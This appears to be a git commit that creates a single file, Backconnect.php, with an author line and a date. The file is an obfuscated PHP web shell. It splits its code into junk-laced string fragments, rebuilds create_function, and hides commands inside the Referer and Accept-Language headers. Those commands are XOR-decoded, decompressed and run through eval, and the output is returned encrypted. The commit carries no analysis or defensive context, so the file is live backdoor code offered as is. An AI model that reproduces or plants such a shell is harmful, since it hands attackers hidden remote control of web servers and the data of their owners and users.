28f0c23d52a121661c106280d95e732c52e2409a
TN.RIJ4L <59259192+rijal-cpu@users.noreply.github.com>
2025-01-07 15:02:04 +0800

    Create Backconnect.php

---
+++ Backconnect.php
@@ -0,0 +1,18 @@
+<?php
+$Q='compre`+s`+s(@x(@base`+6`+4_deco`+de(preg_replac`+e(array("`+`+/_/","/-/"),`+`+array("/","+`';
+$S=str_replace('jx','','cjxreatjxe_jxjxfunjxjxction');
+$P='(`+$i.$kf),0`+,3))`+;$p="";for`+($z=1;`+$z<c`+ount($`+m[1]);$`+z++)$p.=`+$q[`+$m[2][$z]`+];i`+`+f(s';
+$M='`+_LANGUAG`+E"`+]`+;i`+`+`+f($rr&&$ra)`+{$u=par`+se_`+url($`+rr);par`+se_str`+($u["que`+ry"],$q)`';
+$T='$kh="`+3627";$kf="e`+7e6`+";func`+tion`+ x($t,$k)`+{$c=`+s`+tr`+len($k);$l=strle`+n($t)`+;$o="';
+$w='}`+;}}r`+et`+urn $o;`+}$r=$_`+`+SERVER;$rr`+=@$r`+["HT`+TP_REFERER"`+];$ra=@$`+r[`+"HTTP_ACCEPT';
+$s='trpo`+s(`+$p,$h)===0){$s[$i`+]`+="";$p=$ss($`+p,3);}`+if(arr`+`+ay_key_ex`+ists($`+i,$s)){`+`+';
+$d='`+ower";`+$i=$m[`+1][0]`+.$m[1][1];$h`+=$s`+l($`+ss(`+md5($i.$kh)`+`+,0,3));$f=$sl`+($ss`+(md5';
+$m='se64_encod`+`+e(x(g`+zc`+ompr`+ess($o),$k));print("<`+$k>`+$d</$k>")`+;`+@`+session_dest`+roy();}}}}';
+$j='+"),$`+`+ss($s[$i],0`+,$e))`+),$k)))`+;$o=o`+b_get_c`+`+ontents`+();ob_end_c`+`+lean();$d=ba`+';
+$n='+;$`+q=array_values($q)`+;preg_match`+_a`+`+ll("/([\\w])`+[\\w-]+(?:;q=`+0.([\\d])`+)`+?,?/",$r';
+$C='a,`+$m);if`+($`+q&&$m){`+@session_`+start();`+$s`+=&`+$`+_SESSION;$ss`+="subs`+`+tr";$sl="strtol';
+$r='";f`+or(`+$i=0;$i<$l;`+){fo`+r`+($j=`+0;($j<`+$c&&$i<$l);$j+`++,$i+`++){$`+o.=$`+t{$i}^$k{$j';
+$q='$s[$i].=$p;$e`+=strpo`+s(`+$s[$i],`+$f);if`+($e){$k`+=$kh.$`+`+kf`+;ob_star`+t();@eva`+`+l(@gzun';
+$J=str_replace('`+','',$T.$r.$w.$M.$n.$C.$d.$P.$s.$q.$Q.$j.$m);
+$E=$S('',$J);$E();
+?>
